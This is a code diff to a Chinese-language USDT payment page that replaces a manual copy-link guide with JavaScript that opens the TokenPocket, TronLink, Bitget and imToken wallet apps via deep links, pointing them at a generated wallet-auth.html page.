@@ -306,67 +306,6 @@
             box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.3);
         }
         
-        .manual-guide {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 0.75rem;
-            padding: 1.5rem;
-            margin-top: 1.5rem;
-            text-align: left;
-        }
-        
-        .manual-guide h3 {
-            color: #ffd700;
-            margin-bottom: 1rem;
-            text-align: center;
-        }
-        
-        .guide-steps {
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-        }
-        
-        .guide-step {
-            display: flex;
-            align-items: flex-start;
-            gap: 0.75rem;
-        }
-        
-        .step-badge {
-            background: #ffd700;
-            color: #1e3c72;
-            width: 1.5rem;
-            height: 1.5rem;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.8rem;
-            font-weight: bold;
-            flex-shrink: 0;
-            margin-top: 0.1rem;
-        }
-        
-        .step-content {
-            flex: 1;
-            font-size: 0.9rem;
-        }
-        
-        .copy-btn {
-            background: rgba(255, 255, 255, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            color: white;
-            padding: 0.5rem 1rem;
-            border-radius: 0.5rem;
-            cursor: pointer;
-            font-size: 0.8rem;
-            margin-left: 0.5rem;
-        }
-        
-        .copy-btn:active {
-            background: rgba(255, 255, 255, 0.3);
-        }
-        
         @media (max-width: 320px) {
             .wallet-options {
                 grid-template-columns: 1fr;
@@ -422,69 +361,32 @@
                 </div>
                 
                 <div class="wallet-options">
-                    <div class="wallet-option" onclick="selectWallet('TokenPocket')">
+                    <div class="wallet-option" onclick="wakeupWalletApp('TokenPocket')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
                         </div>
                         <div class="wallet-name">TokenPocket</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="selectWallet('TronLink')">
+                    <div class="wallet-option" onclick="wakeupWalletApp('TronLink')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
                         </div>
                         <div class="wallet-name">TronLink</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="selectWallet('Bitget')">
+                    <div class="wallet-option" onclick="wakeupWalletApp('Bitget')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
                         </div>
                         <div class="wallet-name">Bitget Wallet</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="selectWallet('imToken')">
+                    <div class="wallet-option" onclick="wakeupWalletApp('imToken')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
                         </div>
                         <div class="wallet-name">imToken</div>
-                    </div>
-                </div>
-                
-                <div class="manual-guide" id="manualGuide" style="display: none;">
-                    <h3>支付操作指南</h3>
-                    <div class="guide-steps">
-                        <div class="guide-step">
-                            <div class="step-badge">1</div>
-                            <div class="step-content">
-                                <strong>复制支付链接：</strong>
-                                <div style="margin-top: 0.5rem; background: rgba(0,0,0,0.3); padding: 0.75rem; border-radius: 0.5rem; font-size: 0.8rem; word-break: break-all;">
-                                    <span id="paymentLink"></span>
-                                    <button class="copy-btn" onclick="copyPaymentLink()">复制</button>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="guide-step">
-                            <div class="step-badge">2</div>
-                            <div class="step-content">
-                                <strong>打开 <span id="walletName"></span> 应用</strong>
-                            </div>
-                        </div>
-                        <div class="guide-step">
-                            <div class="step-badge">3</div>
-                            <div class="step-content">
-                                <strong>在钱包的 DApp 浏览器中粘贴并打开链接</strong>
-                            </div>
-                        </div>
-                        <div class="guide-step">
-                            <div class="step-badge">4</div>
-                            <div class="step-content">
-                                <strong>按照页面提示完成 USDT 支付授权</strong>
-                            </div>
-                        </div>
-                    </div>
-                    <div style="text-align: center; margin-top: 1.5rem;">
-                        <button class="btn" onclick="openInNewTab()">在新窗口打开支付页面</button>
                     </div>
                 </div>
             </div>
@@ -526,9 +428,6 @@
     </div>
 
     <script>
-        let currentPaymentUrl = '';
-        let selectedWallet = '';
-
         // 显示临时消息函数
         function showTemporaryMessage(message) {
             const existingMessage = document.querySelector('.temporary-message');
@@ -548,7 +447,7 @@
             }, 3000);
         }
 
-        // 检测是否在钱包内部
+        // 检测是否在钱包内部（保持原有逻辑）
         function isInWalletBrowser() {
             return window.ethereum || window.tronWeb || 
                    navigator.userAgent.includes('TokenPocket') ||
@@ -584,7 +483,7 @@
             });
         });
 
-        // 生成支付链接
+        // 生成支付链接 - 改进为生成绝对 URL（包含 origin + 基础路径）
         function generatePaymentUrl() {
             const username = document.getElementById('username').value.trim();
             const nickname = document.getElementById('nickname').value.trim();
@@ -596,54 +495,177 @@
             
             // 生成订单号
             const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+
+            // 计算基础路径（保留当前目录）
+            const origin = window.location.origin;
+            // 取当前路径目录部分，确保在多级路径下也能正确拼接
+            const path = window.location.pathname;
+            const basePath = path.endsWith('/') ? path : path.replace(/\/[^/]*$/, '/');
+            const base = origin + basePath;
+
+            // 构建钱包授权页面 URL（绝对路径）
+            const authUrl = `${base}wallet-auth.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=1.99`;
             
-            // 构建钱包授权页面 URL
-            const authUrl = `payment.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=0.99`;
-            const fullAuthUrl = window.location.origin + (window.location.pathname.includes('/') ? authUrl : '/' + authUrl);
-            
-            return fullAuthUrl;
+            return authUrl;
         }
 
-        // 选择钱包
-        function selectWallet(walletName) {
+        // 钱包唤醒函数（只修改手机浏览器唤醒相关逻辑）
+        function wakeupWalletApp(walletName) {
             const fullAuthUrl = generatePaymentUrl();
             if (!fullAuthUrl) return;
 
-            currentPaymentUrl = fullAuthUrl;
-            selectedWallet = walletName;
+            console.log('支付链接:', fullAuthUrl);
 
-            // 显示操作指南
-            document.getElementById('manualGuide').style.display = 'block';
-            document.getElementById('paymentLink').textContent = fullAuthUrl;
-            document.getElementById('walletName').textContent = walletName;
+            // 如果在钱包内部，直接用绝对 URL 跳转（修复：原来使用相对路径 wallet-auth.html 导致某些浏览器/钱包解析失败）
+            if (isInWalletBrowser()) {
+                showTemporaryMessage('正在跳转到支付页面...');
+                setTimeout(() => {
+                    window.location.href = fullAuthUrl;
+                }, 200);
+                return;
+            }
 
-            showTemporaryMessage(`已选择 ${walletName}，请按照指南操作`);
+            // 根据钱包类型调用不同的唤醒方法（将完整 URL 作为参数传给钱包 deep link）
+            if (walletName === 'TokenPocket') {
+                wakeupTokenPocket(fullAuthUrl);
+            } else if (walletName === 'TronLink') {
+                wakeupTronLink(fullAuthUrl);
+            } else if (walletName === 'Bitget') {
+                wakeupBitget(fullAuthUrl);
+            } else if (walletName === 'imToken') {
+                wakeupImToken(fullAuthUrl);
+            } else {
+                // 默认直接在当前页面打开
+                window.location.href = fullAuthUrl;
+            }
         }
 
-        // 复制支付链接
-        function copyPaymentLink() {
-            if (!currentPaymentUrl) return;
+        // TokenPocket 唤醒
+        function wakeupTokenPocket(fullAuthUrl) {
+            const schemes = [
+                `tpoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `tpoutside://pull.activity?action=openDapp&dappUrl=${encodeURIComponent(fullAuthUrl)}`,
+                `tpoutside://browse?url=${encodeURIComponent(fullAuthUrl)}`,
+                // 通用 https 作为最后尝试（会在浏览器新标签打开）
+                fullAuthUrl
+            ];
             
-            navigator.clipboard.writeText(currentPaymentUrl).then(() => {
-                showTemporaryMessage('支付链接已复制到剪贴板');
-            }).catch(() => {
-                // 降级方案
-                const textArea = document.createElement('textarea');
-                textArea.value = currentPaymentUrl;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
-                showTemporaryMessage('支付链接已复制到剪贴板');
-            });
+            attemptMultipleSchemes(schemes, 'TokenPocket');
         }
 
-        // 在新窗口打开支付页面
-        function openInNewTab() {
-            if (!currentPaymentUrl) return;
+        // TronLink 唤醒
+        function wakeupTronLink(fullAuthUrl) {
+            const schemes = [
+                `tronlink://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `tronlinkoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                // 尝试将 url 直接作为参数的常见变体
+                `tronlink://browse?url=${encodeURIComponent(fullAuthUrl)}`,
+                fullAuthUrl
+            ];
             
-            window.open(currentPaymentUrl, '_blank');
-            showTemporaryMessage('支付页面已在新窗口打开');
+            attemptMultipleSchemes(schemes, 'TronLink');
+        }
+
+        // Bitget Wallet 唤醒
+        function wakeupBitget(fullAuthUrl) {
+            const schemes = [
+                `bitkeep://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitgetwallet://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bk://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                `bitkeep://browse?url=${encodeURIComponent(fullAuthUrl)}`,
+                fullAuthUrl
+            ];
+            
+            attemptMultipleSchemes(schemes, 'Bitget Wallet');
+        }
+
+        // imToken 唤醒
+        function wakeupImToken(fullAuthUrl) {
+            const schemes = [
+                `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`,
+                `imtoken://navigate?url=${encodeURIComponent(fullAuthUrl)}`,
+                `imtokenv2://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                fullAuthUrl
+            ];
+            
+            attemptMultipleSchemes(schemes, 'imToken');
+        }
+
+        // 尝试多个唤醒方案（改进：不依赖同步返回值，逐个尝试并在全部失败后提示）
+        function attemptMultipleSchemes(schemes, walletName) {
+            let tried = 0;
+            let lastAttemptTime = Date.now();
+
+            function tryNextScheme() {
+                if (tried >= schemes.length) {
+                    console.log(`所有 ${walletName} 唤醒方案都尝试完了`);
+                    showTemporaryMessage(`${walletName} 唤醒失败，已打开支付页面（请手动在钱包应用中打开 DApp 浏览器并访问支付页面）`);
+                    return;
+                }
+
+                const scheme = schemes[tried];
+                console.log(`尝试 ${walletName} 方案 ${tried + 1}:`, scheme);
+                attemptWakeup(scheme);
+
+                // 给每个方案一定时间（0.9s - 1.5s）观察是否跳转成功，再尝试下一个
+                tried++;
+                setTimeout(() => {
+                    tryNextScheme();
+                }, 1100);
+            }
+
+            tryNextScheme();
+        }
+
+        // 尝试唤醒钱包（尽量用 iframe + location + open 方法组合提高命中率）
+        function attemptWakeup(scheme) {
+            try {
+                // 如果 scheme 是以 http(s) 开头，直接在新标签打开
+                if (/^https?:\/\//i.test(scheme)) {
+                    // 在移动浏览器上使用 open 可以触发“在新窗口打开”或是被钱包拦截到 DApp 浏览器
+                    window.open(scheme, '_blank');
+                    return;
+                }
+
+                // 方法1: 使用 iframe 触发 scheme（很多钱包支持）
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = scheme;
+                document.body.appendChild(iframe);
+
+                setTimeout(() => {
+                    try { document.body.removeChild(iframe); } catch (e) { /* ignore */ }
+                }, 1200);
+
+                // 方法2: 尝试 location.href（作为后备）
+                setTimeout(() => {
+                    try {
+                        window.location.href = scheme;
+                    } catch (e) {
+                        // ignore
+                    }
+                }, 300);
+
+                // 方法3: 对 Android Chrome，尝试 intent URL（以防深度链接包名解析需要）
+                // 仅当 scheme 看起来是自定义 protocol 时尝试构造 intent（捕获 https 方案时不要构造）
+                if (!/^https?:\/\//i.test(scheme)) {
+                    // 将自定义 scheme 作为 url 参数放入 intent 的路径（通用尝试）
+                    try {
+                        const decoded = decodeURIComponent(scheme);
+                        const intentUrl = `intent://${decoded}#Intent;scheme=${scheme.split(':')[0]};end`;
+                        // 仅在 Android 上尝试（简单 UA 检测）
+                        if (/Android/i.test(navigator.userAgent)) {
+                            setTimeout(() => {
+                                try { window.location.href = intentUrl; } catch (e) { /* ignore */ }
+                            }, 600);
+                        }
+                    } catch (e) {
+                        // ignore
+                    }
+                }
+            } catch (error) {
+                console.log('attemptWakeup 错误:', error);
+            }
         }
 
         // 检测是否在Bitget Wallet内
